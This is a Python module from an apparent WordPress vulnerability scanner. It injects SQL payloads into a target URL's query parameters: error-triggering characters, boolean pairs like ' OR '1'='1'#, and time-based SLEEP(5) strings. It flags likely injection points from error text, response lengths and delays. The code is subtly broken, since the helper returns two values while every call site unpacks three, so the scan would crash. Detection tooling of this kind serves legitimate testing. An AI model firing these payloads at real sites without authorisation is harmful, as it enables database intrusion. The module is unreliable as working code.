# Module for Contextual WordPress SQLi Checks
import requests
import re
from urllib.parse import urlparse, parse_qs, urlencode, quote_plus
from core.utils import make_request
import difflib # For comparing response bodies (optional, can be heavy)

# Common SQL error patterns (non-exhaustive)
SQL_ERROR_PATTERNS = [
    re.compile(r"you have an error in your sql syntax", re.IGNORECASE),
    re.compile(r"warning: mysql_", re.IGNORECASE),
    re.compile(r"unclosed quotation mark after the character string", re.IGNORECASE),
    re.compile(r"quoted string not properly terminated", re.IGNORECASE),
    re.compile(r"SQL command not properly ended", re.IGNORECASE),
    re.compile(r"Microsoft OLE DB Provider for SQL Server", re.IGNORECASE),
    re.compile(r"Oracle ODBC Driver", re.IGNORECASE),
    re.compile(r"supplied argument is not a valid MySQL result resource", re.IGNORECASE),
    re.compile(r"PostgreSQL query failed", re.IGNORECASE),
    re.compile(r"Syntax error near", re.IGNORECASE),
    re.compile(r"ORA-\d{5}:", re.IGNORECASE) # Oracle errors
]

# Basic SQLi test characters for error-based
SQLI_ERROR_TEST_CHARS = ["'", "\"", "`", "-- ", "#", ";", "\\"]

# Basic Boolean-based SQLi payloads
# Payloads should be URL-encoded. '#' is used for comments for URL-friendliness.
# Structure: (payload_true_suffix, payload_false_suffix)
SQLI_BOOLEAN_PAYLOADS = {
    "numeric_context": [
        (" OR 1=1#", " OR 1=2#"),
        (" AND 1=1#", " AND 1=2#"),
        (" OR true#", " OR false#"),
        (" AND true#", " AND false#"),
        # Example: 123 OR GTID_SUBSET(SLEEP(0.1),SLEEP(0.1))#
        # More complex conditions can be added
    ],
    "string_context_single_quote": [
        ("' OR '1'='1'#", "' OR '1'='2'#"),
        ("' AND '1'='1'#", "' AND '1'='2'#"),
        ("' OR true#", "' OR false#"),
        ("' AND true#", "' AND false#"),
    ],
    "string_context_double_quote": [
        ("\" OR \"1\"=\"1\"#", "\" OR \"1\"=\"2\"#"),
        ("\" AND \"1\"=\"1\"#", "\" AND \"1\"=\"2\"#"),
        ("\" OR true#", "\" OR false#"),
        ("\" AND true#", "\" AND false#"),
    ]
}

# Time-based Blind SQLi Payloads
# Using SLEEP function, common in MySQL/MariaDB (WordPress default)
# Structure: (payload_suffix, sleep_duration_seconds)
# {SLEEP_DURATION} will be replaced by the actual sleep duration.
SLEEP_DURATION_SECONDS = 5 # Configurable base sleep duration
SQLI_TIME_BASED_PAYLOADS = {
    "numeric_context": [
        (f" AND SLEEP({SLEEP_DURATION_SECONDS})#", SLEEP_DURATION_SECONDS),
        (f" OR SLEEP({SLEEP_DURATION_SECONDS})#", SLEEP_DURATION_SECONDS),
        # Benchmark can also be used but SLEEP is simpler for detection
        # (f" AND BENCHMARK(5000000,MD5(1))#", SLEEP_DURATION_SECONDS), # Approx 5s on some systems
    ],
    "string_context_single_quote": [
        (f"' AND SLEEP({SLEEP_DURATION_SECONDS})-- ", SLEEP_DURATION_SECONDS), # Using -- for string context
        (f"' OR SLEEP({SLEEP_DURATION_SECONDS})-- ", SLEEP_DURATION_SECONDS),
    ],
    "string_context_double_quote": [
        (f"\" AND SLEEP({SLEEP_DURATION_SECONDS})-- ", SLEEP_DURATION_SECONDS),
        (f"\" OR SLEEP({SLEEP_DURATION_SECONDS})-- ", SLEEP_DURATION_SECONDS),
    ]
}


def _test_sqli_payload(url, config, expected_content_pattern=None, compare_to_response=None, expected_delay_seconds=None):
    """
    Helper to test a single SQLi payload.
    Checks for errors, content differences (boolean), or time delays (time-based).
    Returns: (response_object, detail_message_string)
    """
    request_timeout = config.get('request_timeout', 10) # Default general timeout

    if expected_delay_seconds:
        # For time-based tests, timeout needs to be greater than the expected delay.
        time_based_buffer = config.get('time_based_test_buffer', 3) # e.g., 3 seconds buffer
        request_timeout = expected_delay_seconds + time_based_buffer

    try:
        response = make_request(url, config, method="GET", timeout=request_timeout)
        if not response: # make_request might return None on critical errors before request object is formed
            return None, "No response object received from make_request"
        
        elapsed_time = response.elapsed.total_seconds()

        # 1. Time-based check (if applicable)
        if expected_delay_seconds:
            # Check if elapsed time is close to or greater than expected delay, but less than the request_timeout
            # Allow a small tolerance (e.g., 90% of expected delay)
            if (elapsed_time >= expected_delay_seconds * 0.9) and (elapsed_time < request_timeout):
                return response, f"Potential time-based SQLi: Response took {elapsed_time:.2f}s (expected ~{expected_delay_seconds}s)"

        if not response.text: # Check after time-based, as time-based might not need/have text
             return response, "No response content" # Or response if time-based was positive

        # 2. Error-based check
        for pattern in SQL_ERROR_PATTERNS:
            if pattern.search(response.text):
                return response, f"SQL error pattern matched: {pattern.pattern}"
        
        # 3. Boolean-based: Expected content pattern match (for "true" conditions)
        if expected_content_pattern and expected_content_pattern.search(response.text):
            return response, "Expected content pattern matched (boolean true)"

        # 4. Boolean-based: Compare to another response (e.g., "true" vs "false" or "true" vs "original")
        if compare_to_response and compare_to_response.text:
            len_current = len(response.text)
            len_compare = len(compare_to_response.text)
            # Using a relative and absolute threshold for difference
            # e.g. >100 bytes difference or >10% of the larger response's length
            if abs(len_current - len_compare) > max(100, 0.1 * max(len_compare, len_current, 1)):
                return response, f"Significant content length difference (current: {len_current}, compared: {len_compare})"
            
            # Optional: More detailed diff (can be slow, consider for higher verbosity levels)
            # diff = difflib.unified_diff(compare_to_response.text.splitlines(), response.text.splitlines(), lineterm='')
            # diff_lines = list(diff)
            # if len(diff_lines) > config.get('sqli_diff_line_threshold', 5):
            #     return response, f"Significant content difference detected ({len(diff_lines)} differing lines)"

        return response, None # No specific SQLi indicator found by these checks
    except requests.exceptions.Timeout:
        # If expected_delay_seconds was set, this timeout is expected if it's just above the delay.
        # However, if it's a genuine timeout beyond our calculated request_timeout for time-based, it's a fail.
        # The make_request timeout handles this. Here, it means the request exceeded the (potentially extended) timeout.
        return None, f"Request timed out after {request_timeout}s"
    except Exception as e:
        return None, f"Error during request: {e}"


def analyze_sqli(state, config, target_url):
    """
    Performs enhanced heuristic checks for potential SQLi vulnerabilities.
    Includes error-based checks and basic boolean-based differential analysis.
    This is NOT a comprehensive SQLi scanner. Use SQLMap for thorough testing.
    """
    module_key = "wp_analyzer"
    findings_key = "contextual_sqli"
    findings = state.get_specific_finding(module_key, findings_key, {
        "status": "Running",
        "details": "Performing enhanced heuristic SQLi checks...",
        "potential_error_based_sqli": [],
        "potential_boolean_based_sqli": [],
        "potential_time_based_sqli": [], # Added for time-based
        "recommendation": "Use dedicated SQLi tools (like SQLMap) for comprehensive analysis."
    })

    print("    [i] Performing enhanced SQLi heuristic checks (error, boolean, time-based)...")
    
    parsed_target_url = urlparse(target_url)
    original_query_params = parse_qs(parsed_target_url.query)
    
    error_based_points = []
    boolean_based_points = []
    time_based_points = [] # Added

    if not original_query_params:
        findings["details"] = "No query parameters in target URL to test for SQLi."
        findings["status"] = "Completed"
        state.update_specific_finding(module_key, findings_key, findings)
        print("      [i] No query parameters in target URL for SQLi checks.")
        return

    # Get original response for comparison in boolean tests
    original_response, _, _ = _test_sqli_payload(target_url, config) # Adjusted return
    if not original_response:
        print(f"      [-] Could not fetch original page {target_url}. Boolean-based checks might be less reliable.")

    print(f"      Checking {len(original_query_params)} parameter(s) in URL: {target_url}")
    for param, values in original_query_params.items():
        original_value = values[0]
        # param_found_sqli is used to avoid redundant checks for the same param if one type of SQLi is already found.
        # We can make this more granular if we want to find ALL types for a param.
        # For now, if error-based is found, we might skip boolean/time for that specific error-inducing payload char,
        # but continue other boolean/time tests for the param.
        # Let's track found types per param to avoid over-reporting simple true/false positives from error pages.
        found_error_for_param = False
        found_boolean_for_param = False
        found_time_for_param = False

        # Ensure original_value is a string for concatenation
        str_original_value = str(original_value) if original_value is not None else ""

        # 1. Error-based SQLi checks
        print(f"        Testing error-based SQLi for param '{param}'...")
        for test_char in SQLI_ERROR_TEST_CHARS:
            if found_error_for_param: break 

            payload_val = str_original_value + test_char
            modified_params = {k: v[0] for k, v in original_query_params.items()}
            modified_params[param] = payload_val
            test_query_string = urlencode(modified_params)
            test_url = parsed_target_url._replace(query=test_query_string).geturl()
            
            _, error_detail, _ = _test_sqli_payload(test_url, config) # Adjusted return
            if error_detail and "SQL error pattern matched" in error_detail:
                point_info = {
                    "url": test_url, "parameter": param, "payload_used": payload_val,
                    "type": "Error-based", "observation": error_detail
                }
                error_based_points.append(point_info)
                found_error_for_param = True
                print(f"          [!!!] Potential Error-based SQLi for param '{param}' with char '{test_char}'")
                # Don't break here; let other error chars be tested for completeness,
                # but `found_error_for_param` will prevent boolean/time if an error is already clear.

        # 2. Boolean-based SQLi checks (only if no definitive error-based found for this param yet)
        if not found_error_for_param: # If an error was found, boolean might give false positives on error pages
            print(f"        Testing boolean-based SQLi for param '{param}'...")
            for context_type, payload_pairs in SQLI_BOOLEAN_PAYLOADS.items():
                if found_boolean_for_param: break
                for true_payload_suffix, false_payload_suffix in payload_pairs:
                    payload_true_val = str_original_value + true_payload_suffix
                    modified_params_true = {k: v[0] for k, v in original_query_params.items()}
                    modified_params_true[param] = payload_true_val
                    query_true = urlencode(modified_params_true)
                    url_true = parsed_target_url._replace(query=query_true).geturl()

                    payload_false_val = str_original_value + false_payload_suffix
                    modified_params_false = {k: v[0] for k, v in original_query_params.items()}
                    modified_params_false[param] = payload_false_val
                    query_false = urlencode(modified_params_false)
                    url_false = parsed_target_url._replace(query=query_false).geturl()

                    print(f"          Testing boolean pair for {context_type}: TRUE='{true_payload_suffix}', FALSE='{false_payload_suffix}'")
                    
                    resp_true, detail_true, _ = _test_sqli_payload(url_true, config)
                    resp_false, detail_false, _ = _test_sqli_payload(url_false, config)

                    # Avoid boolean if payloads themselves caused SQL errors (already covered by error-based)
                    if (detail_true and "SQL error" in detail_true) or \
                       (detail_false and "SQL error" in detail_false):
                        print(f"            Skipping boolean for {param} with {true_payload_suffix}/{false_payload_suffix} due to SQL error in response.")
                        continue

                    if resp_true and resp_false and original_response and original_response.text:
                        len_orig = len(original_response.text)
                        len_true = len(resp_true.text) if resp_true.text else 0
                        len_false = len(resp_false.text) if resp_false.text else 0
                        
                        similar_threshold = config.get('sqli_boolean_similarity_threshold', 0.10) # 10%
                        
                        # True is different from False
                        is_true_diff_false = abs(len_true - len_false) > similar_threshold * max(len_true, len_false, 1)
                        # True is like Original
                        is_true_like_orig = abs(len_true - len_orig) < similar_threshold * max(len_true, len_orig, 1)
                        # False is like Original
                        is_false_like_orig = abs(len_false - len_orig) < similar_threshold * max(len_false, len_orig, 1)

                        if is_true_diff_false and (is_true_like_orig != is_false_like_orig): # XOR
                            point_info = {
                                "url_true": url_true, "url_false": url_false, "parameter": param,
                                "payload_true": payload_true_val, "payload_false": payload_false_val,
                                "type": "Boolean-based (Differential)",
                                "observation": f"Response lengths: Original={len_orig}, True={len_true}, False={len_false}. Significant difference suggests boolean-based SQLi."
                            }
                            boolean_based_points.append(point_info)
                            found_boolean_for_param = True
                            print(f"            [!!!] Potential Boolean-based SQLi for param '{param}' (Context: {context_type})")
                            break 
                if found_boolean_for_param: break

        # 3. Time-based Blind SQLi checks (attempt regardless of error/boolean, as it's a distinct method)
        # However, if an error was found, the page might not execute SQL further.
        # Let's run it if no error was found, or be mindful of potential inaccuracies.
        # For now, run if no error_based found, to reduce noise.
        if not found_error_for_param:
            print(f"        Testing time-based SQLi for param '{param}'...")
            for context_type, time_payloads in SQLI_TIME_BASED_PAYLOADS.items():
                if found_time_for_param: break
                for payload_suffix, sleep_duration in time_payloads:
                    
                    payload_val = str_original_value + payload_suffix
                    modified_params = {k: v[0] for k, v in original_query_params.items()}
                    modified_params[param] = payload_val
                    test_query_string = urlencode(modified_params)
                    test_url = parsed_target_url._replace(query=test_query_string).geturl()

                    print(f"          Testing time-based for {context_type} with '{payload_suffix}' (expect ~{sleep_duration}s delay)")
                    
                    # Pass expected_delay_seconds to _test_sqli_payload
                    _, time_detail, _ = _test_sqli_payload(test_url, config, expected_delay_seconds=sleep_duration)

                    if time_detail and "Potential time-based SQLi" in time_detail:
                        point_info = {
                            "url": test_url, "parameter": param, "payload_used": payload_val,
                            "type": "Time-based Blind", "observation": time_detail
                        }
                        time_based_points.append(point_info)
                        found_time_for_param = True
                        print(f"            [!!!] Potential Time-based SQLi for param '{param}' (Context: {context_type})")
                        break # Found for this payload, move to next context or param
                if found_time_for_param: break


    if error_based_points:
        findings["potential_error_based_sqli"] = error_based_points
    if boolean_based_points:
        findings["potential_boolean_based_sqli"] = boolean_based_points
    if time_based_points: # Added
        findings["potential_time_based_sqli"] = time_based_points

    details_parts = []
    if error_based_points:
        details_parts.append(f"{len(error_based_points)} potential error-based SQLi point(s)")
    if boolean_based_points:
        details_parts.append(f"{len(boolean_based_points)} potential boolean-based SQLi point(s)")
    if time_based_points: # Added
        details_parts.append(f"{len(time_based_points)} potential time-based SQLi point(s)")

    if details_parts:
        findings["details"] = f"Found {', '.join(details_parts)}. This strongly suggests SQLi vulnerabilities. Use SQLMap for confirmation and exploitation."
        # Update remediation suggestion if it exists or add a new one
        remediation_desc = f"Enhanced heuristic checks suggest potential SQL Injection vulnerabilities: {', '.join(details_parts)}."
        if time_based_points:
            remediation_desc += " Time-based techniques indicate blind SQLi is likely."
        
        state.add_remediation_suggestion("sqli_heuristic_enhanced", {
            "source": "WP Analyzer (SQLi Heuristic - Enhanced)",
            "description": remediation_desc,
            "severity": "High",
            "remediation": "Immediately investigate and fix these potential SQLi vulnerabilities. Use parameterized queries or prepared statements. Validate and sanitize all user inputs. Run a full scan with a dedicated SQLi tool like SQLMap to confirm and assess the impact. Pay special attention to blind SQLi if time-based results were found."
        })
    else:
        findings["details"] = "No obvious SQLi indicators detected from enhanced heuristic checks (error, boolean, time-based). This does not rule out SQLi. Use SQLMap for thorough testing."

    findings["status"] = "Completed"
    state.update_specific_finding(module_key, findings_key, findings)
    print(f"    [+] Enhanced SQLi heuristic checks finished. Details: {findings['details']}")
